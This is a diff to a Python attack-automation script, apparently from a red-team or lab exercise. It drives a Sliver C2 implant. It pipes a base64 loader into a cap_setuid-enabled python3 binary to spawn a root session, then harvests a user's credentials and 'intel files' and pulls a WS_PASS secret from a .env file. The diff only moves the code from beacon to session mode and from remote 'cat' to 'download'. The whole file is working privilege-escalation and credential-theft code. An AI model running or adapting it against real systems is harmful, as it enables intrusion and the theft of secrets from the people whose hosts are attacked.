@@ -129,8 +129,8 @@ def _parse_root_session_id(sliver_output: str, exclude: set[str]) -> str | None:
 
 
 def _capture_existing_session_ids() -> set[str]:
-    """Snapshot the set of currently-active beacon IDs."""
-    out = _list_sliver("beacons")
+    """Snapshot the set of currently-active session IDs."""
+    out = _list_sliver("sessions")
     ids: set[str] = set()
     saw_header = False
     for line in out.splitlines():
@@ -150,7 +150,7 @@ def _capture_existing_session_ids() -> set[str]:
 
 def subphase_capability_privesc(sliver_session_id: str, cap_binary: str,
                                 kali_host: str, scratch_dir: Path) -> str:
-    """Sub-phase A: invoke the capable python3 to spawn a root Sliver beacon.
+    """Sub-phase A: invoke the capable python3 to spawn a root Sliver session.
 
     Single-shot pipeline: ``echo <b64> | base64 -d | <cap_binary>``. The
     capable python3 honours the file's cap_setuid+ep on exec, so the
@@ -167,7 +167,7 @@ def subphase_capability_privesc(sliver_session_id: str, cap_binary: str,
     log(f"[+] Elevated loader: {len(elevated_b64)} base64 bytes")
 
     before = _capture_existing_session_ids()
-    log(f"[*] Existing beacon(s) before invocation: {sorted(before)}")
+    log(f"[*] Existing session(s) before invocation: {sorted(before)}")
 
     # sliver's `execute` parser eats ANY token starting with `-` after the
     # binary as if it were a sliver flag (silently!) -- so without `--` to
@@ -183,30 +183,25 @@ def subphase_capability_privesc(sliver_session_id: str, cap_binary: str,
     log(f"[*] sliver: {cmd[:90]}...")
     sliver_exec(sliver_session_id, cmd)
 
-    log(f"[*] Polling for the new root beacon (expected <{CAP_POLL_MAX_SECS}s)...")
+    log(f"[*] Polling for the new root session (expected <{CAP_POLL_MAX_SECS}s)...")
     deadline = time.time() + CAP_POLL_MAX_SECS
     while time.time() < deadline:
         time.sleep(CAP_POLL_INTERVAL_SECS)
-        out = _list_sliver("beacons")
+        out = _list_sliver("sessions")
         root_id = _parse_root_session_id(out, exclude=before)
         if root_id:
-            log(f"[+] New root beacon captured: {root_id}")
+            log(f"[+] New root session captured: {root_id}")
             return root_id
-        log("[*] still waiting for root beacon...")
+        log("[*] still waiting for root session...")
     raise RuntimeError(
-        "advanced_webserver_privesc: capable python3 produced no root beacon "
+        "advanced_webserver_privesc: capable python3 produced no root session "
         f"within {CAP_POLL_MAX_SECS} s; verify cap_setuid+ep on {cap_binary} "
         f"with `getcap {cap_binary}` from a manual sliver session"
     )
 
 
 def subphase_harvest_creds(root_session_id: str, scratch_dir: Path) -> dict:
-    """Sub-phase B: as root via the new session, pull John's creds + intel files.
-
-    Note: In Beacon C2 mode, standard 'download' command triggers an interactive 
-    TTY prompt during 'tasks fetch', causing subprocess commands to block and time out.
-    We bypass this by executing 'cat' remotely and writing the returned stdout to disk.
-    """
+    """Sub-phase B: as root via the new session, pull John's creds + intel files."""
     log("\n=== Sub-phase B: credential harvest as root ===")
     loot_dir = scratch_dir / "downloads"
     loot_dir.mkdir(parents=True, exist_ok=True)
@@ -215,25 +210,23 @@ def subphase_harvest_creds(root_session_id: str, scratch_dir: Path) -> dict:
     for remote_path in HARVEST_PATHS:
         local_name = Path(remote_path).name
         local_target = loot_dir / local_name
-        log(f"[*] sliver: cat {remote_path} -> {local_target}")
-        
-        # Execute cat remotely and capture stdout
-        file_content = sliver_exec(
+        log(f"[*] sliver: download {remote_path} -> {local_target}")
+        sliver_exec(
             root_session_id,
-            f"execute -o -- cat {remote_path}",
-            timeout=45,
+            f"download {remote_path} {local_target}",
+            timeout=20,
         )
-        
-        if file_content:
+        if local_target.is_file():
             try:
-                local_target.write_text(file_content, encoding="utf-8")
-                files[remote_path] = file_content
+                files[remote_path] = local_target.read_text(
+                    encoding="utf-8", errors="replace"
+                )
                 log(f"[+] harvested {remote_path}  ({local_target.stat().st_size} bytes)")
             except Exception as e:
-                log(f"[-] could not write local {local_target}: {e}")
+                log(f"[-] could not read local {local_target}: {e}")
                 files[remote_path] = None
         else:
-            log(f"[-] read produced no content for {remote_path}")
+            log(f"[-] download produced no local file at {local_target}")
             files[remote_path] = None
 
     # Extract the WS_PASS=value from the .env if it landed.
